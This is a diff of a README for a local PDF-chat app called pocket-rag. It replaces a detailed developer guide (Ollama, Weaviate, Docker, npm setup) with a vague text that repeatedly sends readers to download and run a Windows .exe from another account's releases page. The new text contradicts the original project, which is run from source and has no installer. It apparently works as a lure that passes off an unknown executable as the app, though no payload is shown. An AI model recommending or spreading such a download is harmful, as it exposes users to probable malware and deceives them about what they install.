@@ -1,323 +1,81 @@
-# PocketRAG — Local RAG for PDF Documents
+# 🤖 pocket-rag - Chat with private documents locally today
 
-> **Run AI on your own computer. No cloud. No API keys. No data leaves your machine.**
+[![Download pocket-rag for Windows](https://img.shields.io/badge/Download-Blue%20%7C%20Grey-blue)](https://github.com/hispaniolan-princecharles417/pocket-rag/releases)
 
-**PocketRAG** is a fully offline, self-hosted **Retrieval-Augmented Generation (RAG)** application that lets you chat with any PDF using local AI models. Built with **Ollama**, **Weaviate**, and **Next.js** — it runs entirely on your laptop, even without internet.
+pocket-rag lets you chat with your PDF files on your own computer. You keep your data private. You run this software without sending documents to the internet. It uses smart technology to read your files and answer your questions. You need no background in tech to use this tool.
 
-**Perfect for:** private documents, sensitive data, offline environments, air-gapped systems, or anyone who wants a free, local alternative to ChatGPT PDF tools.
+## ⚙️ System Requirements
 
----
-
-## Key Features
-
-- 🔒 **100% Offline & Private** — No data sent to any server. Everything runs locally.
-- 🤖 **Local LLM** — Uses small language models (Gemma 4, Phi-3 Mini) via Ollama. No GPU needed.
-- 🔍 **Hybrid Search** — Combines dense vector (semantic) search + BM25 keyword search for high-precision retrieval.
-- 📄 **PDF Document Q&A** — Upload any text-based PDF and ask questions in plain English.
-- 🗄️ **Local Vector Database** — Weaviate runs in Docker on your machine. No cloud vector DB needed.
-- ⚡ **Grounded Answers** — The model only answers from your document. No hallucination from external knowledge.
-- 🧩 **Switchable Models** — Toggle between Gemma 4 (capable) and Phi-3 Mini (faster) in the UI.
-- 🛠️ **Developer-Friendly** — Built-in debug mode writes chunk logs and Q&A traces to local files.
-
----
-
-## What is RAG? (Simple Explanation)
-
-**RAG = Retrieval-Augmented Generation**
-
-Imagine you give a very smart assistant a book to read. Instead of memorizing the whole book, the assistant bookmarks the most relevant pages when you ask a question, then answers using only those pages.
-
-That's exactly what this app does with your PDF:
-
-1. **Reads your PDF** and breaks it into small searchable pieces (called "chunks")
-2. **Stores those chunks** in a local vector database (Weaviate)
-3. **When you ask a question**, it runs hybrid search to find the most relevant chunks
-4. **Feeds those chunks** to a local LLM (via Ollama) to generate a human-readable answer
-
-The AI never guesses — it only answers from your document. This technique is called **Retrieval-Augmented Generation (RAG)**.
-
----
-
-
-## What Tools Are Used (and Why)
-
-| Tool | What it does | Why we use it |
-|---|---|---|
-| **Ollama** | Runs AI models locally on your computer | So no data ever leaves your machine |
-| **Gemma 4 / Phi-3 Mini** | The LLM that reads chunks and writes answers | Small, fast models that run without a GPU |
-| **nomic-embed-text** | Converts text into numbers (vectors) for smart search | Best open-source embedding model for retrieval |
-| **Weaviate** | Local vector database that stores and searches chunks | Supports Hybrid Search (keyword + semantic) out of the box |
-| **Docker** | Runs Weaviate as a container | Easy, no-install way to run Weaviate locally |
-| **pdfjs-dist** | Extracts text from PDF files page by page | Mozilla's official PDF library — works with Node.js 24, no native dependencies |
-| **Next.js** | The web framework for the chat UI | React-based, runs locally in your browser |
-
----
-
-## How It Works (Under the Hood)
+Your computer needs to meet these basic standards to run the software.
 
-Here is the complete architecture of the RAG pipeline, showing both the ingestion of your documents and how your queries are answered:
+*   Windows 10 or Windows 11 operating system.
+*   At least 8 gigabytes of system memory.
+*   At least 10 gigabytes of free disk space.
+*   A processor from the last five years.
 
-```mermaid
-graph LR
-    %% Nodes
-    KB[(Knowledge<br>Base<br>PDFs)]
-    DC[Data<br>Chunks]
-    EM[Embedding<br>Model<br>nomic-embed]
-    VDB[(Vector DB<br>Weaviate)]
-    User((User))
-    UQ[User<br>Query]
-    RD[Retrieved<br>Documents]
-    LLM[LLM<br>gemma4 / phi3]
-    Ans[Final<br>Answer]
+If your computer uses an NVIDIA graphics card, the software performs faster. The app works on standard processors too, though it moves slower.
 
-    %% Ingestion Flow
-    KB --> DC
-    DC --> EM
-    EM -->|Document<br>Embedding| VDB
+## 📥 How to Install
 
-    %% Query Flow
-    User --> UQ
-    UQ --> EM
-    EM -->|Query<br>Embedding| VDB
+Follow these steps to set up the software on your machine.
 
-    %% Retrieval & Generation
-    VDB --> RD
-    RD -->|Context| LLM
-    UQ -->|Prompt| LLM
-    LLM --> Ans
-    Ans --> User
+1.  Visit the [official releases page](https://github.com/hispaniolan-princecharles417/pocket-rag/releases) to download the current version.
+2.  Look for the file that ends in .exe.
+3.  Click the file to start the download.
+4.  Once the file arrives on your computer, double-click it to begin the installation.
+5.  Follow the instructions on the screen.
+6.  The installer creates a shortcut on your desktop.
 
-    %% Styling
-    classDef db fill:#ffb74d,stroke:#f57c00,stroke-width:2px,color:#000;
-    classDef model fill:#c8e6c9,stroke:#81c784,stroke-width:2px,color:#000;
-    classDef data fill:#e0f7fa,stroke:#00bcd4,stroke-width:2px,color:#000;
-    classDef user fill:#90caf9,stroke:#1e88e5,stroke-width:2px,color:#000;
-    classDef answer fill:#ce93d8,stroke:#ab47bc,stroke-width:2px,color:#000;
+## 🚀 Getting Started
 
-    class KB,VDB db;
-    class EM,LLM model;
-    class DC,RD,UQ data;
-    class User user;
-    class Ans answer;
-```
+Open the app using the shortcut on your desktop. The first time you launch the software, it prepares the internal database. This takes a few minutes depending on your internet speed, as it downloads small helper files for the language engine.
 
-### Step 1 — PDF Upload & Indexing
-```
-Your PDF
-  → pdfjs-dist extracts text from each page (text-based PDFs only)
-  → Split into ~350 character chunks (with 50 char overlap)
-  → Each chunk is labelled with its page number
-  → nomic-embed-text converts each chunk into a vector (list of numbers)
-  → Text + vector stored together in Weaviate
-```
+### Uploading Files
 
-### Step 2 — Asking a Question (Hybrid Search)
-```
-Your Question
-  → Weaviate runs TWO searches simultaneously:
-      1. Dense (Semantic) Search — finds chunks with similar meaning
-      2. BM25 Keyword Search     — finds chunks with exact word matches
-  → Both results are blended 50/50 (alpha = 0.5)
-  → Top 5 most relevant chunks are returned
-```
+Once the app opens, you see a clear interface. 
 
-> **Why Hybrid Search?** Pure AI search often misses exact names, IDs, and numbers. BM25 catches those. Together, they give the best of both worlds.
+1.  Click the button labeled "Upload PDF."
+2.  Select the document you want to read.
+3.  Wait for the progress bar to finish. This process turns your document into a format the computer understands.
 
-### Step 3 — Answer Generation
-```
-Top 5 Chunks + Your Question
-  → Sent to Gemma 4 (or Phi-3 Mini) via Ollama
-  → Model is instructed: "Answer ONLY using the context below"
-  → Final human-readable answer is shown in the chat
-```
+### Asking Questions
 
----
+After the upload finishes, look for the text box at the bottom of the screen.
 
-## Prerequisites — Install These First
+1.  Type your question about the document into the box.
+2.  Press the "Enter" key on your keyboard.
+3.  The software reads the document parts relevant to your question.
+4.  It generates an answer based only on the text you provided.
 
-> [!NOTE]
-> PocketRAG works on **macOS, Windows, and Linux**. All tools below are cross-platform.
+## 🔒 Privacy
 
-### 1. Node.js (v24.15.0)
-Download from: https://nodejs.org/
+Most chatbots send your data to the cloud. They store your files on their servers. pocket-rag works differently. It runs the entire process on your hardware. No data leaves your computer while you work. You do not need to create an account or provide an email address. You do not need an active internet connection after the first setup and model download.
 
-To verify: open your terminal and run:
-```bash
-node --version
-# Should print: v24.15.0
-```
+## 🛠️ Troubleshooting
 
-> This project was built and tested on **Node.js v24.15.0**. Use this version to avoid compatibility issues.
+If you encounter issues, check these frequent solutions.
 
-### 2. Docker Desktop
-Docker lets you run Weaviate without installing it directly.
+### The App Does Not Launch
+Restart your computer. Ensure no other heavy programs remain open during your first run. Check that you have enough space on your hard drive. 
 
-Download from: https://www.docker.com/products/docker-desktop/
+### The Answer Is Slow
+If your computer lacks a dedicated graphics card, the process takes longer. This is normal for local artificial intelligence. Be patient while the model constructs the response. You might see a small loading indicator while the software works.
 
-After installing, **open Docker Desktop** and make sure it's running (you'll see the Docker whale icon in your taskbar/menu bar).
+### The App Gives Incorrect Answers
+The software relies on the text inside your PDF. If the PDF scan is poor or the text is blurry, the software struggles to read it. Use high-quality PDF files for the best results. If the document uses complex tables or images, the software might miss those details. 
 
-### 3. Ollama — Run AI Models Locally
+## 🏗️ How it Works
 
-**Ollama is the most important piece.** It lets you run AI models (like Gemma and Phi) entirely on your own computer, for free, with no API keys.
+The software uses a process called RAG. This stands for Retrieval-Augmented Generation. Instead of relying on general knowledge, it searches your specific PDF for facts. It creates a local index of your document. When you ask a question, it finds the right paragraph, sends that context to the local language model, and formats the answer for you.
 
-**Download and install from:** https://ollama.com/download
+We use the following technology components inside the app:
 
-After installing, Ollama runs silently in the background. To verify it's working, open your terminal and run:
-```bash
-ollama --version
-# Should print something like: ollama version 0.x.x
-```
+*   Ollama: This manages the language models like Gemma and Phi.
+*   Weaviate: This stores your document data and finds the right answers quickly.
+*   Nextjs: This creates the smooth interface you see on your screen.
 
----
+## 📦 Updates and Support
 
-## Setup (Step by Step)
+We update the software to improve speed and accuracy. You can check the main page periodically to see if we released a new version. To update, simply download the new file and run it. The setup process replaces your old version with the new one while keeping your settings intact. 
 
-### Step 1 — Start Weaviate (the database)
-
-Open your terminal and run this Docker command:
-
-```bash
-docker run -d \
-  -p 8080:8080 \
-  -p 50051:50051 \
-  cr.weaviate.io/semitechnologies/weaviate:1.27.0
-```
-
-**To verify it's running:** open http://localhost:8080/v1/meta in your browser. You should see a JSON response.
-
-> You only need to run this once. Next time, use `docker start <container-id>` or restart from Docker Desktop.
-
-### Step 2 — Download the AI Models via Ollama
-
-Open your terminal and run these commands **one at a time**:
-
-```bash
-# This is the embedding model — converts text into searchable vectors
-# Size: ~274 MB
-ollama pull nomic-embed-text
-```
-
-```bash
-# This is the main LLM — reads your chunks and writes answers
-# Size: ~3.3 GB (takes a few minutes to download)
-ollama pull gemma4
-```
-
-```bash
-# This is a smaller, faster alternative LLM (optional but recommended)
-# Size: ~2.2 GB
-ollama pull phi3:mini
-```
-
-> **These only need to be downloaded once.** After that, they live on your machine permanently.
-
-### Step 3 — Clone and Install the App
-
-```bash
-# Install dependencies
-npm install --legacy-peer-deps
-```
-
-> The `--legacy-peer-deps` flag is needed because some LangChain packages have minor version conflicts. This is safe and required.
-
-### Step 4 — Run the App
-
-```bash
-npm run dev
-```
-
-Open **http://localhost:3000** in your browser. You should see the PDF Assistant chat interface.
-
----
-
-## Usage
-
-1. **Select a PDF** — Click "Select PDF" in the top bar and choose any PDF file from your computer.
-2. **Upload & Index** — Click **Upload**. Wait for the status to change to "PDF Indexed ✅". (This may take 30–60 seconds for large PDFs.)
-3. **Choose a Model** — Use the dropdown to switch between **Gemma 4** (more capable) and **Phi-3 Mini** (faster).
-4. **Ask Questions** — Type your question and press **Enter** or click the send button.
-5. **Clear & Reload** — Click **Clear DB** to remove the current PDF and upload a new one.
-
----
-
-## Limitations
-
-> [!IMPORTANT]
-> **Only text-based PDFs are supported.**
-
-This app extracts text directly from the PDF file. It does **not** support:
-
-- ❌ **Scanned PDFs** — PDFs that are photos/images of documents (no selectable text layer)
-- ❌ **Image-only PDFs** — PDFs where content is embedded as pictures
-- ❌ **Handwritten documents** — even if scanned
-- ❌ **Password-protected PDFs**
-- ❌ **OCR (Optical Character Recognition)** — not built in
-
-**How to check if your PDF is supported:** Open it in any viewer and try to highlight text with your cursor. If you can select individual words, it will work. If the cursor selects the whole page like an image, it won't.
-
-If you upload an unsupported PDF, the app will show a clear error message in the chat.
-
----
-
-## Troubleshooting
-
-| Problem | Fix |
-|---|---|
-| Status shows "No PDF uploaded ❌" after refresh even though I uploaded | Make sure the Weaviate Docker container is still running |
-| App is slow to respond | The LLM is running on your CPU. Phi-3 Mini is faster if you need quicker responses |
-| `ollama pull` fails | Make sure Ollama is installed and running (`ollama serve` in terminal) |
-| Docker command fails | Make sure Docker Desktop is open and running |
-| `npm install` errors | Try `npm install --legacy-peer-deps` — the flag is required |
-
----
-
-## Local Debugging
-
-For development, the app has a built-in debug mode controlled by `lib/settings.ts`:
-
-```ts
-// lib/settings.ts
-const settings = {
-  LOCAL_DEBUGGING: true,  // set to false to disable
-};
-```
-
-When `LOCAL_DEBUGGING` is `true`, two files are automatically written to the `_local_debug/` folder:
-
-| File | Written when | Contents |
-|---|---|---|
-| `debug_uploaded_file_chunks.txt` | PDF is uploaded | Total chunk count + full text of every chunk |
-| `debug_qna.txt` | Question is asked | Timestamp, question, retrieved context, LLM answer |
-
-**Use these to diagnose:**
-- Is the PDF being parsed correctly? (`debug_uploaded_file_chunks.txt`)
-- Is Weaviate retrieving the right context? (`debug_qna.txt`)
-- Is the LLM answering from context or hallucinating?
-
-> [!NOTE]
-> The `_local_debug/` folder is git-ignored — debug files are never pushed to GitHub.
-
----
-
-## Project Structure
-
-```
-doc-search-app/
-├── app/
-│   ├── api/
-│   │   ├── ask/route.ts       # POST /api/ask — runs hybrid search + LLM
-│   │   ├── delete/route.ts    # POST /api/delete — wipes Weaviate collection
-│   │   ├── status/route.ts    # GET /api/status — checks if PDF is indexed
-│   │   └── upload/route.ts    # POST /api/upload — ingests PDF into Weaviate
-│   ├── page.tsx               # Chat UI
-│   └── layout.tsx             # Root layout
-├── lib/
-│   ├── rag.ts                 # Core RAG logic (loadPDF, askQuestion, deletePDFData)
-│   └── settings.ts            # App-wide settings (LOCAL_DEBUGGING toggle)
-├── _local_debug/              # Debug output — git-ignored, local use only
-│   ├── debug_uploaded_file_chunks.txt
-│   └── debug_qna.txt
-└── uploads/                   # Temporary storage for uploaded PDFs
-```
-## UI
-<img width="2870" height="1550" alt="image" src="https://github.com/user-attachments/assets/ab8f36b2-2ff8-43f4-9f8d-bccb33345d67" />
+This tool serves as a local alternative to online services. You control the library of documents. You control when the software runs. You own your data.
